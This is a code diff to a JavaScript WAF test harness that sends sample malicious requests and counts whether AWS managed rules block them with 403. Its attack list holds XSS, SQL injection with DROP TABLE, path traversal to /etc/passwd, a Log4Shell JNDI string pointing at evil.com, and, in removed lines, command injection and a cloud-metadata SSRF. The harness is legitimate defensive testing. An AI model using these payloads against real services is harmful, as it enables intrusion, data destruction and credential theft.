@@ -148,18 +148,23 @@ async function testStress(endpoint, length) {
 }
 
 async function testException(endpoint) {
+  // AWS Managed Rules (Common / KnownBadInputs / SQLi) 가 실제로 차단하는 패턴만 사용.
+  // → 서버 WAF 동작과 부하 도구 측정이 일치하도록.
   var attacks = [
-    { path: '/v1/user?email=' + encodeURIComponent('\x3cscript\x3ealert("xss")\x3c/script\x3e') + '&requestid=1&uuid=1', method: 'GET' },
+    // XSS (AWSManagedRulesCommonRuleSet - CrossSiteScripting_*)
+    { path: '/v1/user?email=' + encodeURIComponent('\x3cscript\x3ealert(1)\x3c/script\x3e') + '&requestid=1&uuid=1', method: 'GET' },
     { path: '/v1/user?email=' + encodeURIComponent('"\x3e\x3cimg src=x onerror=alert(1)\x3e') + '&requestid=1&uuid=1', method: 'GET' },
+    // SQL Injection (AWSManagedRulesSQLiRuleSet)
     { path: "/v1/user?email=' OR 1=1 --&requestid=1&uuid=1", method: 'GET' },
     { path: "/v1/user?email=admin'; DROP TABLE user;--&requestid=1&uuid=1", method: 'GET' },
     { path: "/v1/product?id=1 UNION SELECT * FROM users--&requestid=1&uuid=1", method: 'GET' },
-    { path: "/v1/user?email=../../etc/passwd&requestid=1&uuid=1", method: 'GET' },
+    // Path traversal (CommonRuleSet - GenericLFI)
+    { path: "/v1/user?email=../../../../etc/passwd&requestid=1&uuid=1", method: 'GET' },
+    // Log4Shell / bad inputs (KnownBadInputs)
     { path: '/v1/user?email=' + encodeURIComponent('${jndi:ldap://evil.com/a}') + '&requestid=1&uuid=1', method: 'GET' },
-    { path: "/v1/user?email=;cat /etc/passwd&requestid=1&uuid=1", method: 'GET' },
-    { path: "/v1/product?id=http://169.254.169.254/latest/meta-data&requestid=1&uuid=1", method: 'GET' },
-    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: "admin' OR '1'='1", email: "sqli@test.com" }) },
-    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: "test onmouseover=alert(1)", email: "xss@evil.com" }) },
+    // POST SQLi / XSS in body
+    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: "admin' OR '1'='1", email: "a@b.com" }) },
+    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: "\x3cscript\x3ealert(1)\x3c/script\x3e", email: "a@b.com" }) },
   ];
 
   var attack = attacks[Math.floor(Math.random() * attacks.length)];
@@ -171,12 +176,19 @@ async function testException(endpoint) {
     var res = await fetch(proxyUrl, fetchOpts);
     var data = await res.json();
     var status = data.status || 0;
+
+    // status 0 = 프록시 타임아웃/네트워크 오류 → WAF와 무관하므로 카운트 제외
+    if (status === 0) {
+      return { status: 0 };
+    }
+
     stats.exception.total++;
+    // 문제지: 비정상 요청은 403 으로 차단되어야 함
     if (status === 403) {
       stats.exception.success++;
-      log('\u{1F6E1}\uFE0F WAF \uCC28\uB2E8 (403): ' + attack.path.substring(0, 60));
+      log('\u{1F6E1}\uFE0F WAF \uCC28\uB2E8 (403): ' + attack.path.substring(0, 55));
     } else {
-      log('\u26A0\uFE0F WAF \uBBF8\uCC28\uB2E8 (' + status + '): ' + attack.path.substring(0, 60), true);
+      log('\u26A0\uFE0F \uBBF8\uCC28\uB2E8 (' + status + '): ' + attack.path.substring(0, 55), true);
     }
     return { status: status };
   } catch(e) {
